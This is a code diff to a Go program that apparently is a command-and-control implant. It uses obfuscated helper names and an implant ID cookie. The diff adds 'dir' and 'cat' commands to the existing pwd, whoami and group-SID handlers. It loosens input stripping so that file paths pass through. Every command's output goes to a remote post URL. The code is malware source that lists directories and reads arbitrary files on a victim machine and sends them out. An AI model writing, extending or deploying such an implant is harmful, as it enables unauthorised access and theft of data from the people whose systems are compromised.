@@ -11,6 +11,7 @@ import (
 	"math/rand"
 	"net/http"
 	b "reflect"
+	"regexp"
 	"strings"
 )
 
@@ -31,20 +32,15 @@ type unknown struct {
 
 // procOut is out the output from command processing
 var procOut string
+var procIn string
+var command string
 
 // https://stackoverflow.com/questions/54461423/efficient-way-to-remove-all-non-alphanumeric-characters-from-large-text
-func strip(s string) string {
-	var result strings.Builder
-	for i := 0; i < len(s); i++ {
-		u := s[i]
-		if ('a' <= u && u <= 'z') ||
-			('A' <= u && u <= 'Z') ||
-			('0' <= u && u <= '9') ||
-			u == ' ' {
-			result.WriteByte(u)
-		}
-	}
-	return result.String()
+// https://pkg.go.dev/regexp
+// Use raw strings to avoid having to quote backslashes
+func strip(in string) string {
+	reg, _ := regexp.Compile(`[^a-zA-Z0-9\/\\:\-\. ]+`)
+	return reg.ReplaceAllString(in, "")
 }
 
 func BB176245(x int) bool {
@@ -83,6 +79,24 @@ func X1A9T(x int) bool {
 	toGet1 := (result && (d|x)%17 == 0) || (d^0xFF != x^0x1234)
 
 	return toGet1 || x == 42
+}
+
+// runCommands is where command processing occurs
+// since this was architected in such a way that commands could be two places, a singular function was used
+func runCommands(in string) (out string) {
+	switch in {
+	case "pwd":
+		procOut = shared.GetCurrentDir()
+	case "whoami":
+		procOut = shared.GetCurrentUser()
+	case "groupSID":
+		procOut = shared.GetGroupsSID()
+	case "dir":
+		procOut = shared.GetDir(procIn)
+	case "cat":
+		procOut = shared.ReadFile(procIn)
+	}
+	return
 }
 
 func main() {
@@ -202,14 +216,8 @@ startpoint:
 						// List arbitrary dir, read file, write file, execute Lua
 						// Returns the result of execution (stdout or bool) or returns an error
 						decoded = strip(decoded)
-						switch decoded {
-						case "pwd":
-							procOut = shared.GetCurrentDir()
-						case "whoami":
-							procOut = shared.GetCurrentUser()
-						case "groupSID":
-							procOut = shared.GetGroupsSID()
-						}
+						command, procIn, _ = strings.Cut(decoded, " ")
+						runCommands(command)
 
 						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
 						err = shared.SendDataRequest(postUrl, procOut, maxRetries, impIdCookie)
@@ -294,12 +302,8 @@ startpoint:
 						// A switch statement to run through possible command options, including using the lua engine
 						// List arbitrary dir, read file, write file, execute Lua
 						// Returns the result of execution (stdout or bool) or returns an error
-						fmt.Println(decoded)
-						switch decoded {
-						case "pwd":
-							procOut = shared.GetCurrentDir()
-							fmt.Println("Current dir:", procOut)
-						}
+						decoded = strip(decoded)
+						runCommands(decoded)
 
 						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
 						err = shared.SendDataRequest(postUrl, procOut, maxRetries, impIdCookie)
